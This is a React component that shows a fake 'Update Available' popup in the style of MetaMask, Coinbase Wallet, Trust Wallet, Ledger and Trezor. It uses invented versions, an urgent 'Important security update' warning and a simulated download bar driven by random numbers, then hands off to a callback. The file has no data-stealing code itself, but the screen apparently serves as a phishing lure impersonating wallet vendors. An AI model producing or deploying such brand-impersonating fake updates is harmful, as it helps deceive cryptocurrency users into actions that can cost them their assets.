"use client"

import { useState } from "react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import { X } from "lucide-react"

interface WalletUpdatePopupProps {
  isOpen: boolean
  onClose: () => void
  walletName: string
  onUpdateComplete: () => void
}

const walletUpdates = {
  Metamask: {
    version: "12.12.0",
    features: [
      "Fix main build modifying desktop build steps",
      "Improving the security system",
      "Fix incorrect network information",
      "Improve performance on signature request",
    ],
  },
  "Coinbase Wallet": {
    version: "3.105.0",
    features: [
      "Enhanced DeFi integration and swap functionality",
      "Improved wallet connection reliability",
      "Critical security enhancements",
      "Bug fixes and performance improvements",
    ],
  },
  "Trust Wallet": {
    version: "8.15.2",
    features: [
      "New staking rewards system",
      "Enhanced security protocols",
      "Improved transaction speed",
      "Bug fixes and stability improvements",
    ],
  },
  Ledger: {
    version: "2.73.1",
    features: [
      "Enhanced hardware security",
      "New app compatibility",
      "Improved Bluetooth connectivity",
      "Performance optimizations",
    ],
  },
  "Trezor Wallet": {
    version: "9.0.15",
    features: [
      "Advanced security features",
      "New coin support added",
      "Improved user interface",
      "Enhanced recovery options",
    ],
  },
}

export function WalletUpdatePopup({ isOpen, onClose, walletName, onUpdateComplete }: WalletUpdatePopupProps) {
  const [isUpdating, setIsUpdating] = useState(false)
  const [progress, setProgress] = useState(0)

  const updateInfo = walletUpdates[walletName as keyof typeof walletUpdates] || {
    version: "1.0.0",
    features: ["General improvements", "Bug fixes", "Security updates"],
  }

  const handleUpdate = () => {
    setIsUpdating(true)
    setProgress(0)

    // Simulate update progress
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          setTimeout(() => {
            setIsUpdating(false)
            onUpdateComplete()
          }, 500)
          return 100
        }
        return prev + Math.random() * 15
      })
    }, 200)
  }

  if (isUpdating) {
    return (
      <Dialog open={isOpen} onOpenChange={onClose}>
        <DialogContent className="max-w-md p-6 text-center">
          <div className="space-y-6">
            {/* Wallet Logo */}
            <div className="flex justify-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
                <div
                  className="w-8 h-8 bg-blue-600 rounded animate-spin"
                  style={{
                    background: `conic-gradient(from 0deg, #3b82f6 ${progress * 3.6}deg, #e5e7eb ${progress * 3.6}deg)`,
                  }}
                />
              </div>
            </div>

            <div className="space-y-2">
              <h3 className="text-lg font-semibold">Updating {walletName}</h3>
              <p className="text-sm text-gray-600">Please wait while we update to version {updateInfo.version}</p>
            </div>

            <div className="space-y-2">
              <Progress value={progress} className="w-full" />
              <p className="text-sm text-gray-500">Downloading update... {Math.round(progress)}%</p>
            </div>

            <p className="text-xs text-gray-500">This may take a few moments. Please do not close this window.</p>
          </div>
        </DialogContent>
      </Dialog>
    )
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md p-0">
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b">
          <div className="flex items-center gap-2">
            <div className="w-6 h-6 bg-orange-500 rounded flex items-center justify-center">
              <span className="text-white text-xs">🦊</span>
            </div>
            <span className="text-sm font-medium">{walletName}</span>
          </div>
          <Button variant="ghost" size="sm" onClick={onClose}>
            <X className="w-4 h-4" />
          </Button>
        </div>

        {/* Content */}
        <div className="p-6 space-y-6">
          <div className="text-center space-y-2">
            <h3 className="text-lg font-semibold">Update Available</h3>
            <p className="text-sm text-gray-600">Version {updateInfo.version}</p>
          </div>

          <div className="bg-blue-50 p-4 rounded-lg space-y-2">
            <div className="flex items-center gap-2">
              <div className="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                <span className="text-white text-xs">!</span>
              </div>
              <span className="text-sm font-medium text-blue-900">Important security update</span>
            </div>
            <p className="text-xs text-blue-800">
              We recommend installing this update to ensure the security of your wallet and assets.
            </p>
          </div>

          <div className="space-y-3">
            <h4 className="text-sm font-medium">What's new</h4>
            <ul className="space-y-2">
              {updateInfo.features.map((feature, index) => (
                <li key={index} className="flex items-start gap-2 text-sm text-gray-600">
                  <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0" />
                  {feature}
                </li>
              ))}
            </ul>
          </div>

          <Button onClick={handleUpdate} className="w-full bg-blue-600 hover:bg-blue-700 text-white">
            Update now
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  )
}
